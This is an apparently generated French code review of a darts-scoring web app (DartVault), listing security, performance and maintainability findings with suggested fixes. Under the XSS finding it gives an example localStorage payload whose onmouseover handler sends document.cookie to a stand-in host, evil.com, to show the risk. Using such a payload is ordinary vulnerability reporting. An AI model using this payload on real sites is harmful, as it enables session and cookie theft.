# DartVault — Code Review

> Généré le 2026-03-15 · Architecture : PWA Vanilla JS · Déploiement : Netlify

---

## Résumé exécutif

DartVault est une PWA bien structurée avec un Service Worker fonctionnel, une intégration hardware WebSocket propre, et un système de thèmes cohérent. Le code est lisible et bien commenté. Cependant, plusieurs problèmes de **sécurité à corriger en priorité** ont été identifiés, notamment une vulnérabilité XSS et des headers HTTP manquants. Des optimisations de performance sont également possibles.

---

## 🔴 CRITIQUE — Sécurité

### 1. XSS via `innerHTML` + `localStorage` — `autodarts-bridge.js:376`

**Problème :** La valeur de l'IP est lue depuis `localStorage` et insérée directement dans `innerHTML` sans aucune sanitisation.

```javascript
// autodarts-bridge.js ligne 375-377
<input class="ad-ip-input" id="ad-ip-field" type="text"
       value="${currentIP}" placeholder="192.168.1.37" />
```

Si un attaquant modifie `localStorage.dartvault_autodarts_ip` (via une autre XSS, une extension malveillante, ou les DevTools partagés), il peut injecter des attributs HTML arbitraires :

```
// Payload dans localStorage :
" onmouseover="fetch('https://evil.com?c='+document.cookie)

// HTML résultant :
<input value="" onmouseover="fetch('https://evil.com?c='+document.cookie)" .../>
```

**Correction :**
```javascript
// Remplacer l'interpolation directe par une création DOM
const input = document.createElement('input');
input.className = 'ad-ip-input';
input.id = 'ad-ip-field';
input.type = 'text';
input.value = currentIP; // .value est sûr, pas innerHTML
input.placeholder = '192.168.1.37';
```

---

### 2. Absence de validation de l'IP — `autodarts-bridge.js:58-59`

**Problème :** N'importe quelle chaîne est acceptée comme IP et utilisée dans l'URL WebSocket. Un utilisateur pourrait pointer le bridge vers un hôte arbitraire.

```javascript
function setIP(ip) {
  localStorage.setItem(STORAGE_KEY, ip); // aucune validation
}

// Utilisé ensuite pour construire une URL WebSocket vers n'importe quel hôte
return proto + '://' + ip + ':' + port + '/api/events';
```

**Correction :** Valider le format avant de sauvegarder.

```javascript
function isValidIP(ip) {
  return /^(\d{1,3}\.){3}\d{1,3}$/.test(ip) &&
    ip.split('.').every(n => Number(n) <= 255);
}
```

---

### 3. Headers de sécurité HTTP manquants — `_headers` / `netlify.toml`

**Problème :** Plusieurs headers de sécurité critiques sont absents. Seul `X-Frame-Options` est configuré.

| Header manquant | Impact |
|---|---|
| `Content-Security-Policy` | Pas de protection contre XSS, injection |
| `X-Content-Type-Options: nosniff` | MIME sniffing possible |
| `Referrer-Policy` | Fuite d'URL dans les referers |
| `Permissions-Policy` | Accès non restreint aux APIs navigateur |

**Correction à ajouter dans `_headers` :**
```
/*.html
  X-Content-Type-Options: nosniff
  Referrer-Policy: strict-origin-when-cross-origin
  Permissions-Policy: camera=(), microphone=(), geolocation=()
  Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; font-src 'self'; connect-src 'self' ws://192.168.1.0/24:3180 wss://192.168.1.0/24:3181; img-src 'self' data:
```

> Note : `'unsafe-inline'` est nécessaire à cause des scripts de thème inline. Une refactorisation vers des scripts externes permettrait de supprimer cette exception.

---

## 🟠 IMPORTANT — Performance & Architecture

### 4. `autodarts-bridge.js` et `autodarts-501.js` absents du Service Worker

**Problème :** Ces deux fichiers critiques ne sont pas dans le `PRECACHE` de `sw.js`. Ils ne seront pas disponibles hors-ligne lors de la première visite, et ne bénéficieront pas du cache-first.

```javascript
// sw.js — fichiers manquants dans PRECACHE :
'/autodarts-bridge.js',
'/autodarts-501.js',
```

**Correction :** Ajouter les deux entrées à la liste `PRECACHE`.

---

### 5. CSS thème dupliqué dans chaque page HTML

**Problème :** Chaque fichier HTML embed ses propres variables CSS `:root { --bg: ... }` qui redéfinissent les mêmes valeurs. `theme.css` existe pour centraliser cela, mais les pages n'y font pas toutes confiance.

- `index.html:23-53` → 31 lignes de variables CSS inline
- `501.html:24-28` → variables `:root` inline
- Idem pour cricket.html, etc.

Cela représente ~300 lignes dupliquées à travers les 15 pages. Un changement de couleur demande de modifier chaque fichier.

**Recommandation :** Standardiser l'import de `theme.css` et supprimer les blocs `:root` inline redondants. Utiliser uniquement les variables de `theme.css` comme source de vérité.

---

### 6. Boucle de retry infinie — `autodarts-501.js:20-22`

**Problème :** Si `dHit()` n'est jamais disponible (page d'erreur, mauvaise intégration), la boucle `setTimeout(init, 500)` tourne indéfiniment.

```javascript
if (typeof dHit !== 'function') {
  console.warn('[Autodarts-501] dHit() not found, retrying...');
  setTimeout(init, 500); // ← pas de limite
  return;
}
```

**Correction :** Ajouter un compteur de tentatives.

```javascript
function init(attempt = 0) {
  if (attempt > 20) {
    console.error('[Autodarts-501] dHit() not found after 20 attempts. Giving up.');
    return;
  }
  if (typeof dHit !== 'function') {
    setTimeout(() => init(attempt + 1), 500);
    return;
  }
  // ...
}
```

---

### 7. `skipWaiting()` appelé deux fois — `sw.js:62` et `sw.js:104`

**Problème :** `self.skipWaiting()` est appelé à la fin de l'événement `install` ET dans le handler `message`. L'appel dans `install` est redondant avec le mécanisme message, ou vice versa — selon l'usage réel.

```javascript
// install (ligne 62) — force toujours skipWaiting
.then(() => self.skipWaiting())

// message (ligne 103-105) — pour mise à jour contrôlée
if (e.data && e.data.type === 'SKIP_WAITING') {
  self.skipWaiting();
}
```

Si `skipWaiting()` est appelé dans `install`, le handler message ne sert à rien. Si on veut un contrôle manuel des mises à jour (meilleure UX : notifier l'utilisateur qu'une mise à jour est disponible), supprimer l'appel dans `install`.

---

### 8. Styles inline injectés via `innerHTML` à chaque ouverture de modal

**Problème :** Chaque appel à `createUI()` et `showSettingsModal()` injecte un bloc `<style>` entier dans le DOM. Ces styles sont ré-parsés à chaque fois par le navigateur.

```javascript
// autodarts-bridge.js:198 — bloc <style> de 50 lignes injecté à chaque appel
indicator.innerHTML = `
  <style>
    #ad-bridge-indicator { ... }
    /* ... 50 lignes ... */
  </style>
  ...
`;
```

**Recommandation :** Déplacer ces styles dans `theme.css` ou `autodarts-bridge.css` et les charger une seule fois.

---

### 9. Conflits et redondances de redirections

**Problème :** Les redirections sont définies à deux endroits avec des règles qui se chevauchent.

`_redirects` :
```
/home     /home.html    200
/play     /index.html   200
```

`netlify.toml` :
```toml
[[redirects]]
  from = "/*"
  to = "/index.html"
  status = 200
  conditions = {Language = ["fr"]}
```

La règle `/* → /index.html` dans `netlify.toml` avec condition `Language=fr` va rediriger **toutes** les URLs (y compris `/501.html`, `/cricket.html`) vers `index.html` pour les utilisateurs francophones. C'est probablement involontaire et peut causer des boucles ou des 404 inattendus.

**Recommandation :** Vérifier l'intention de cette règle. Si c'est pour la gestion de l'historique SPA, s'assurer que les routes HTML directes sont exclues, ou utiliser une règle plus précise.

---

## 🟡 AMÉLIORATION — Qualité du code

### 10. Variables `active` et `enabled` redondantes — `autodarts-bridge.js`

```javascript
let active = false;   // contrôle la reconnexion auto
let enabled = false;  // état toggle utilisateur
```

Dans `start()`, les deux sont mis à `true` simultanément. Dans `stop()`, les deux sont mis à `false`. La distinction n'est jamais exploitée de façon asymétrique. Fusionner en une seule variable simplifierait le code.

---

### 11. Couplage fragile aux globaux du jeu — `autodarts-501.js`

Le script accède directement à des variables globales du jeu (`G`, `inputMode`, `dartState`, `dHit`, `dUpdateMult`, `toggleInputMode`) sans interface définie.

```javascript
if (typeof G === 'undefined' || !G.gameStarted) { ... }
if (typeof inputMode !== 'undefined' && inputMode !== 'darts') { ... }
dartState.mult = mult;
```

Si le jeu 501 est refactorisé et que ces globals changent de nom, le bridge sera silencieusement cassé sans erreur claire.

**Recommandation :** Définir un contrat d'interface explicite dans 501.html :
```javascript
window.DartGame501 = {
  isStarted: () => G.gameStarted,
  registerDart: (number, mult) => { dartState.mult = mult; dHit(number); },
  setInputMode: (mode) => toggleInputMode(mode)
};
```

---

### 12. `lang.js` non inclus dans l'analyse de sécurité CSP

`lang.js` est un fichier de ~34k tokens — le plus gros du projet. Il est chargé par toutes les pages. S'il venait à être compromis (CDN hijack, supply chain), il pourrait exécuter du code arbitraire sur toutes les pages. Un hash CSP (`script-src 'sha256-...'`) ou un Subresource Integrity (SRI) renforcerait la sécurité.

---

### 13. `viewport-fit=cover` sans `safe-area` sur certaines pages

`index.html:9` utilise `viewport-fit=cover` sans `env(safe-area-inset-*)` dans le padding. D'autres pages (comme `501.html`) utilisent correctement `max(140px, env(safe-area-inset-bottom))`. À uniformiser.

---

## ✅ Points positifs

| Aspect | Détail |
|---|---|
| **Structure SW** | Cache-first bien implémenté, purge des anciens caches correcte |
| **Thème Flash** | Script inline au tout début du `<head>` évite le FOUC |
| **Reconnexion WS** | Logique de reconnexion auto propre avec guard `reconnectTimer` |
| **Touch UX** | `touch-action: manipulation`, `-webkit-tap-highlight-color: transparent` systématiques |
| **Safe area** | `env(safe-area-inset-bottom)` sur les pages de jeu |
| **Fonts auto-hébergées** | Aucune dépendance CDN pour les polices, offline ok |
| **IIFE** | `autodarts-bridge.js` et `autodarts-501.js` encapsulés, pas de pollution globale |
| **Commentaires** | Bonne documentation inline des flows WebSocket et du format dart |
| **Manifest PWA** | Complet, 9 tailles d'icônes, maskable |
| **Séparation jeux** | Chaque jeu est indépendant, navigable directement par URL |

---

## Plan de corrections priorisé

| Priorité | Fichier | Action |
|---|---|---|
| 🔴 P1 | `autodarts-bridge.js:375` | Remplacer `innerHTML` interpolé par création DOM pour le champ IP |
| 🔴 P1 | `_headers` | Ajouter `X-Content-Type-Options`, `Referrer-Policy`, `Permissions-Policy` |
| 🔴 P1 | `autodarts-bridge.js:58` | Ajouter validation regex de l'IP avant `localStorage.setItem` |
| 🟠 P2 | `sw.js:14-55` | Ajouter `autodarts-bridge.js` et `autodarts-501.js` au PRECACHE |
| 🟠 P2 | `autodarts-501.js:20` | Limiter la boucle de retry à ~20 tentatives |
| 🟠 P2 | `netlify.toml` | Vérifier/corriger la règle de redirection `/*` avec condition Language |
| 🟠 P2 | `sw.js:62` | Choisir entre skipWaiting dans install ou via message (pas les deux) |
| 🟡 P3 | Tous les HTML | Supprimer les blocs `:root` inline redondants, centraliser dans `theme.css` |
| 🟡 P3 | `autodarts-bridge.js:198` | Externaliser les styles inline vers un fichier CSS |
| 🟡 P3 | `autodarts-501.js` | Définir une interface explicite `window.DartGame501` dans 501.html |

---

## Architecture — Vue d'ensemble

```
autovault/
├── Pages HTML (15)          — Chaque jeu est autonome
│   ├── index.html           — Hub principal
│   ├── [jeu].html           — Logique inline (CSS + JS + HTML)
│   └── ...
├── lang.js                  — i18n centralisé (FR/EN)
├── sw.js                    — Service Worker cache-first
├── autodarts-bridge.js      — Bridge WebSocket → DartVault
├── autodarts-501.js         — Intégration bridge ↔ jeu 501
├── theme.css                — Variables CSS thème (dark/light/colored)
├── fonts/                   — Polices WOFF2 auto-hébergées
├── icons/                   — Icônes PWA (9 tailles)
└── Netlify config           — _headers, _redirects, netlify.toml
```

### Flux Autodarts

```
Plateau physique
      ↓ USB/réseau
Autodarts Board Manager (local, port 3180/3181)
      ↓ WebSocket
autodarts-bridge.js (AutodartsBridge)
      ↓ callbacks (onDart, onTakeout, onStatus)
autodarts-501.js → dHit(number)
      ↓
Logique jeu 501 (501.html inline JS)
```

### Flux PWA / Offline

```
Première visite  → Network → Cache (PRECACHE + ressources dynamiques)
Visites suivantes → Cache-first → Network fallback
Hors-ligne        → Cache-first → index.html fallback pour navigation
Mise à jour       → CACHE_VERSION bump → purge ancien cache → re-cache
```
